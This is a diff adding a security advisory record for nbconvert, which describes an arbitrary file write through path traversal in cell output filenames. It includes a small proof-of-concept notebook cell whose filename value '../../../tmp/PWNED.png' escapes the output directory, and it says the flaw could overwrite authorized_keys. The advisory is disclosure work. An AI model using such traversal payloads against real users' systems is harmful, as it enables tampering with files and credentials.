@@ -1,0 +1,72 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-pjvx-prjx-h659",
+  "modified": "2026-10-22T16:23:28Z",
+  "published": "2026-10-22T16:23:28Z",
+  "aliases": [
+    "CVE-2026-114140"
+  ],
+  "summary": "nbconvert: Arbitrary file write through path traversal in cell output filenames when exporting to md, latex, rst and asciidoc",
+  "details": "### Summary\n\nnbconvert <= v7.17.1 has an arbitrary file write vulnerability due to a path traversal in ipynb cell output metadata, more specifically on the filename attribute.\n\nVulnerable converters : `--to markdown`, `--to latex`, `--to rst`, `--to asciidoc`.\n\nIn `ExtractOutputPreprocessor`, `extractoutput.py:116-119` joins attacker-controlled  `path` to `output_files_dir` with no canonicalization check, enabling arbitrary file write.\n\nThis is a sibling vulnerability of https://github.com/advisories/GHSA-4c99-qj7h-p3vg.\n\n### Impact\n\nIf a victim runs nbconvert on a malicious ipynb file, it can create some files with arbitrary data in arbitrary locations, i.e. override authorized_keys.\n\nNote that running the cell with jupyter overrides the output, so it would \"clean up\" malicious cells.\n\n### PoC\n\nIn a ipynb file:\n\n```json\n\n\"cells\": [{\n        \"cell_type\": \"code\", \"id\": \"abc123\", \"execution_count\": 1,\n        \"metadata\": {}, \"source\": \"# PoC\",\n        \"outputs\": [{\n            \"output_type\": \"display_data\",\n            \"metadata\": {\n                \"filename\": \"../../../tmp/PWNED.png\"  # ← traverses outside output_dir\n            },\n            \"data\": {\n                # minimal valid PNG (1×1 pixel)\n                \"image/png\": \"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==\"\n            }\n        }]\n    }]\n\n```\n\n\n### Patches\n\nFixed in \n- https://github.com/jupyter/nbconvert/commit/ce4bd99aec31d81d759fa8eeb8643179392ec66f\n- [7.17.2](https://github.com/jupyter/nbconvert/releases/tag/v7.17.2)",
+  "severity": [
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:A/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "nbconvert"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "5.4.0"
+            },
+            {
+              "fixed": "7.17.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 7.17.1"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/jupyter/nbconvert/security/advisories/GHSA-pjvx-prjx-h659"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-114140"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jupyter/nbconvert/commit/ce4bd99aec31d81d759fa8eeb8643179392ec66f"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/jupyter/nbconvert"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jupyter/nbconvert/releases/tag/v7.17.2"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-22"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-10-22T16:23:28Z",
+    "nvd_published_at": "2026-10-21T21:17:56Z"
+  }
+}
